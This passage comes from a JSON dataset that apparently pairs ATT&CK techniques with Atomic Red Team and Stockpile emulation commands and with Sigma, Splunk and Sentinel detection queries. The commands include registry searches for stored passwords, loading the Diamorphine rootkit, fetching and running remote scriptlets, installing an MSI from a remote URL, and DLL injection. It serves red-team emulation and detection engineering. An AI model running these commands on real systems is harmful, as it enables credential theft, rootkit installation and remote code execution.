EventID: 4673\n          Service: 'LsaRegisterLogonProcess()'\n          Keywords: '0x8010000000000000'   #failure\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: User couldn't call a privileged service 'LsaRegisterLogonProcess'\nid: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54\ndescription: The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege\n    privilege set. Possible Rubeus tries to get a handle to LSA.\nstatus: experimental\nreferences:\n    - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\ntags:\n    - attack.lateral_movement\n    - attack.privilege_escalation\n    - attack.t1208\nauthor: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        - EventID: 4673\n          Service: 'LsaRegisterLogonProcess()'\n          Keywords: '0x8010000000000000'   #failure\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4673\" AND Service:\"LsaRegisterLogonProcess\\\\(\\\\)\" AND Keywords:\"0x8010000000000000\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/User-couldn\\'t-call-a-privileged-service-\\'LsaRegisterLogonProcess\\' <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"User couldn\\'t call a privileged service \\'LsaRegisterLogonProcess\\'\",\\n    \"description\": \"The \\'LsaRegisterLogonProcess\\' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1208\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4673\\\\\" AND Service:\\\\\"LsaRegisterLogonProcess\\\\\\\\(\\\\\\\\)\\\\\" AND Keywords:\\\\\"0x8010000000000000\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4673\\\\\" AND Service:\\\\\"LsaRegisterLogonProcess\\\\\\\\(\\\\\\\\)\\\\\" AND Keywords:\\\\\"0x8010000000000000\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'User couldn\\'t call a privileged service \\'LsaRegisterLogonProcess\\'\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4673\" AND Service:\"LsaRegisterLogonProcess\\\\(\\\\)\" AND Keywords:\"0x8010000000000000\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4673\" Service=\"LsaRegisterLogonProcess()\" Keywords=\"0x8010000000000000\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4673\" Service=\"LsaRegisterLogonProcess()\" Keywords=\"0x8010000000000000\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4673)(?=.*LsaRegisterLogonProcess\\\\(\\\\))(?=.*0x8010000000000000))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: kerberos weak encryption\ndescription: domain environment test\nreferences: https://adsecurity.org/?p=3458\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4769 #kerberos Service Ticket Request\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TicketOptions: 0x40810000 # Additional information> Ticket Options\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TicketEncryptiontype: 0x17 # Additional information> Ticket Encryption Type\n\u00a0\u00a0\u00a0\u00a0reduction:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- ServiceName: '$ *' # service name> service information\n\u00a0\u00a0\u00a0\u00a0condition: selection and not reduction\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1214/T1214.yaml", "command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "name": null}, {"source": "atomics/T1214/T1214.yaml", "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "name": null}, {"source": "data/abilities/credential-access/3aad5312-d48b-4206-9de4-39866c12e60f.yml", "command": {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}, "name": "Search for possible credentials stored in Registry"}], "command_list": ["reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}], "technique_id": "T1214", "parsed_datasets": [{"Atomic Red Team Test - Credentials in Registry": {"display_name": "Credentials in Registry", "atomic_tests": [{"description": "Queries to enumerate for credentials in the Registry.\n", "supported_platforms": ["windows"], "name": "Enumeration for Credentials in Registry", "executor": {"elevation_required": false, "command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "name": "command_prompt"}}, {"description": "Queries to enumerate for PuTTY credentials in the Registry.\n", "supported_platforms": ["windows"], "name": "Enumeration for PuTTY Credentials in Registry", "executor": {"elevation_required": false, "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "name": "command_prompt"}}], "attack_technique": "T1214"}}, {"Mitre Stockpile - Search for possible credentials stored in Registry": {"platforms": {"windows": {"psh": {"command": "reg query HKCU /f password /t REG_SZ /s\n"}}}, "description": "Search for possible credentials stored in Registry", "tactic": "credential-access", "technique": {"attack_id": "T1214", "name": "Credentials in Registry"}, "id": "3aad5312-d48b-4206-9de4-39866c12e60f", "name": "Credentials in Registry"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"reg query HKLM \\\\/f password \\\\/t REG_SZ \\\\/s\"or process_command_line contains \"reg query HKCU \\\\/f password \\\\/t REG_SZ \\\\/s\"or process_command_line contains \"Get-UnattendedInstallFile\"or process_command_line contains \"Get-Webconfig\"or process_command_line contains \"Get-ApplicationHost\"or process_command_line contains \"Get-SiteListPassword\"or process_command_line contains \"Get-CachedGPPPassword\"or process_command_line contains \"Get-RegistryAutoLogon\")", "product": "Azure Sentinel", "name": "Credentials In Registry"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1215/T1215.yaml", "command": "insmod diamorphine.ko\n", "name": null}, {"source": "atomics/T1215/T1215.yaml", "command": "insmod diamorphine.ko\n", "name": null}], "command_list": ["insmod diamorphine.ko\n", "insmod diamorphine.ko\n"], "technique_id": "T1215", "parsed_datasets": [{"Atomic Red Team Test - Kernel Modules and Extensions": {"display_name": "Kernel Modules and Extensions", "atomic_tests": [{"description": "This test uses the insmod command to load a kernel module for Linux.\n", "supported_platforms": ["linux"], "name": "Linux - Load Kernel Module via insmod", "input_arguments": {"kernel_module_file": {"default": "diamorphine.ko", "type": "path", "description": "KO object containing kernel module code."}, "module_name": {"default": "diamorphine", "type": "string", "description": "Kernel module name once loaded."}}, "executor": {"elevation_required": true, "command": "insmod #{kernel_module_file}\n", "name": "bash", "cleanup_command": "rmmod #{module_name}\n"}}], "attack_technique": "T1215"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1216/T1216.yaml", "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct\"\n", "name": null}, {"source": "atomics/T1216/T1216.yaml", "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n", "name": null}, {"source": "atomics/T1216/T1216.yaml", "command": "set comspec=C:\\Windows\\System32\\calc.exe\ncscript manage-bde.wsf\n", "name": null}, {"source": "SysmonHunter - Signed Script Proxy Execution", "command": "PubPrn.vbsPubPrn.vbs", "name": null}], "command_list": ["cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct\"\n", "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n", "set comspec=C:\\Windows\\System32\\calc.exe\ncscript manage-bde.wsf\n", "PubPrn.vbsPubPrn.vbs"], "technique_id": "T1216", "parsed_datasets": [{"Atomic Red Team Test - Signed Script Proxy Execution": {"display_name": "Signed Script Proxy Execution", "atomic_tests": [{"description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n", "supported_platforms": ["windows"], "name": "PubPrn.vbs Signed Script Bypass", "input_arguments": {"remote_payload": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct", "type": "Url", "description": "A remote payload to execute using PubPrn.vbs."}}, "executor": {"elevation_required": false, "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n", "name": "command_prompt"}}, {"description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\n", "supported_platforms": ["windows"], "name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "input_arguments": {"command_to_execute": {"default": "Start-Process calc", "type": "string", "description": "A PowerShell command to execute."}}, "executor": {"elevation_required": false, "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n", "name": "command_prompt"}}, {"description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n", "supported_platforms": ["windows"], "name": "manage-bde.wsf Signed Script Command Execution", "input_arguments": {"command_to_execute": {"default": "C:\\Windows\\System32\\calc.exe", "type": "Path", "description": "A command to execute."}}, "executor": {"elevation_required": false, "command": "set comspec=#{command_to_execute}\ncscript manage-bde.wsf\n", "name": "command_prompt", "cleanup_command": "set comspec=C:\\Windows\\System32\\cmd.exe\n"}}], "attack_technique": "T1216"}}, {"SysmonHunter - T1216": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "PubPrn.vbs"}}, "type": "process", "file": {"path": {"pattern": "PubPrn.vbs"}}}], "description": null, "name": "Signed Script Proxy Execution", "level": "high"}}], "queries": [{"query": "Sysmon| where process_path contains \"cscript\"or process_path contains \"wscript\"or process_path contains \"certutil\"or process_path contains \"jjs\"and file_directory !contains \" /nologo \\\"MonitorKnowledgeDiscovery.vbs\\\"\"", "product": "Azure Sentinel", "name": "Signed Script Proxy Execution"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/chrome-bookmarks.txt \\;\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "where.exe /R C:\\Users\\ Bookmarks\n", "name": null}, {"source": "atomics/T1217/T1217.yaml", "command": "where /R C:\\Users\\ Bookmarks\n", "name": null}, {"source": "data/abilities/discovery/b007fc38-9eb7-4320-92b3-9a3ad3e6ec25.yml", "command": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}, "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n"}}}, "name": "Get Chrome Bookmarks"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/browser_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/browser_data", "name": "Empire Module Command"}], "command_list": ["find / -path \"*.mozilla/firefox/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/chrome-bookmarks.txt \\;\n", "where.exe /R C:\\Users\\ Bookmarks\n", "where /R C:\\Users\\ Bookmarks\n", {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}, "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n"}}}, "powershell/collection/browser_data", "powershell/collection/browser_data"], "technique_id": "T1217", "parsed_datasets": [{"Atomic Red Team Test - Browser Bookmark Discovery": {"display_name": "Browser Bookmark Discovery", "atomic_tests": [{"description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["linux"], "name": "List Mozilla Firefox Bookmark Database Files on Linux", "executor": {"command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "name": "sh"}}, {"description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "name": "List Mozilla Firefox Bookmark Database Files on macOS", "executor": {"command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/firefox-bookmarks.txt \\;\n", "name": "sh"}}, {"description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n", "supported_platforms": ["macos"], "name": "List Google Chrome Bookmark JSON Files on macOS", "executor": {"command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/chrome-bookmarks.txt \\;\n", "name": "sh"}}, {"description": "Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.\n", "supported_platforms": ["windows"], "name": "List Google Chrome Bookmarks on Windows with powershell", "executor": {"command": "where.exe /R C:\\Users\\ Bookmarks\n", "name": "powershell"}}, {"description": "Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.\n", "supported_platforms": ["windows"], "name": "List Google Chrome Bookmarks on Windows with command prompt", "executor": {"command": "where /R C:\\Users\\ Bookmarks\n", "name": "command_prompt"}}], "attack_technique": "T1217"}}, {"Mitre Stockpile - Get Chrome Bookmarks": {"platforms": {"darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}, "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n"}}}, "description": "Get Chrome Bookmarks", "tactic": "discovery", "technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "name": "Get Chrome Bookmarks"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1217", "Empire Module": "powershell/collection/browser_data", "Technique": "Browser Bookmark Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/browser_data\":  [\"T1217\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_command_line contains \"*firefox*places.sqlite*\")", "product": "Azure Sentinel", "name": "Browser Bookmark Discovery"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1218/T1218.yaml", "command": "mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /q /i \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /q /i \"http://site.com/file.msi\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "msiexec.exe /y \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "odbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"}\n", "name": null}, {"source": "atomics/T1218/T1218.yaml", "command": "InfDefaultInstall.exe PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n", "name": null}, {"source": "SysmonHunter - Signed Binary Proxy Execution", "command": "mavinject.exe|SyncAppvPublishingServer.exe", "name": null}], "command_list": ["mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n", "SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"\n", "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n", "msiexec.exe /q /i \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi\"\n", "msiexec.exe /q /i \"http://site.com/file.msi\"\n", "msiexec.exe /y \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"\n", "odbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"}\n", "InfDefaultInstall.exe PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n", "mavinject.exe|SyncAppvPublishingServer.exe"], "technique_id": "T1218", "parsed_datasets": [{"Atomic Red Team Test - Signed Binary Proxy Execution": {"display_name": "Signed Binary Proxy Execution", "atomic_tests": [{"dependencies": [{"description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "mavinject - Inject DLL into running process", "executor": {"elevation_required": true, "command": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\n", "name": "command_prompt"}, "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n", "input_arguments": {"dll_payload": {"default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll", "type": "Path", "description": "DLL to inject"}, "process_id": {"default": 1000, "type": "string", "description": "PID of process receiving injection"}}, "dependency_executor_name": "powershell"}, {"description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.\n", "supported_platforms": ["windows"], "name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "input_arguments": {"powershell_code": {"default": "Start-Process calc.exe", "type": "string", "description": "PowerShell code to execute"}}, "executor": {"command": "SyncAppvPublishingServer.exe \"n; #{powershell_code}\"\n", "name": "command_prompt"}}, {"dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Register-CimProvider - Execute evil dll", "executor": {"command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}\n", "name": "command_prompt"}, "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n", "input_arguments": {"dll_payload": {"default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll", "type": "Path", "description": "DLL to execute"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "T1218.msi must exist on disk at specified location (#{msi_payload})\n", "get_prereq_command": "Write-Host \"You must provide your own MSI\"\n", "prereq_command": "if (Test-Path #{msi_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Msiexec.exe - Execute Local MSI file", "executor": {"command": "msiexec.exe /q /i \"#{msi_payload}\"\n", "name": "command_prompt"}, "description": "Execute arbitrary MSI file. Commonly seen in application installation.\n", "input_arguments": {"msi_payload": {"default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi", "type": "Path", "description": "MSI file to execute"}}, "dependency_executor_name": "powershell"}, {"description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution.\n", "supported_platforms": ["windows"], "name": "Msiexec.exe - Execute Remote MSI file", "input_arguments": {"msi_payload": {"default": "http://site.com/file.msi", "type": "String", "description": "MSI file to execute"}}, "executor": {"command": "msiexec.exe /q /i \"#{msi_payload}\"\n", "name": "command_prompt"}}, {"dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Msiexec.exe - Execute Arbitrary DLL", "executor": {"command": "msiexec.exe /y \"#{dll_payload}\"\n", "name": "command_prompt"}, "description": "Execute arbitrary DLL file stored locally. Commonly seen in application installation.\n", "input_arguments": {"dll_payload": {"default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll", "type": "Path", "description": "DLL to execute"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Odbcconf.exe - Execute Arbitrary DLL", "executor": {"command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "name": "command_prompt"}, "description": "Execute arbitrary DLL file stored locally.\n", "input_arguments": {"dll_payload": {"default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll", "type": "Path", "description": "DLL to execute"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_to_execute})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "InfDefaultInstall.exe .inf Execution", "executor": {"elevation_required": false, "command": "InfDefaultInstall.exe #{inf_to_execute}\n", "name": "command_prompt"}, "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n", "input_arguments": {"inf_to_execute": {"default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf", "type": "string", "description": "Local location of inf file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1218"}}, {"SysmonHunter - T1218": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "mavinject.exe|SyncAppvPublishingServer.exe"}}, "type": "process"}], "description": null, "name": "Signed Binary Proxy Execution", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 3and (process_path contains \"certutil.exe\"or process_command_line contains \"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_path contains \"*\\\\replace.exe\")", "product": "Azure Sentinel", "name": "Signed Binary Proxy Execution Network"}, {"query": "Sysmon| where EventID == 1and (process_command_line contains \"mavinject*\\\\/injectrunning\"or process_command_line contains \"mavinject32*\\\\/injectrunning*\"or process_command_line contains \"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*certutil*script\\\\:https\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*msiexec*http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*msiexec*https\\\\[\\\\:\\\\]\\\\/\\\\/*\")", "product": "Azure Sentinel", "name": "Signed Binary Proxy Execution Process"}, {"query": "title: MavInject Process Injection\nid: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\nstatus: experimental\ndescription: Detects process injection using the signed Windows tool Mavinject32.exe\nreferences:\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152\nauthor: Florian Roth\ndate: 2018/12/12\ntags:\n    - attack.t1055\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* /INJECTRUNNING *'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MavInject Process Injection\nid: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\nstatus: experimental\ndescription: Detects process injection using the signed Windows tool Mavinject32.exe\nreferences:\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152\nauthor: Florian Roth\ndate: 2018/12/12\ntags:\n    - attack.t1055\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* /INJECTRUNNING *'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\ \\\\/INJECTRUNNING\\\\ *", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MavInject-Process-Injection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MavInject Process Injection\",\\n    \"description\": \"Detects process injection using the signed Windows tool Mavinject32.exe\",\\n    \"tags\": [\\n      \"attack.t1055\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\/INJECTRUNNING\\\\\\\\ *\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\ \\\\\\\\/INJECTRUNNING\\\\\\\\ *\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  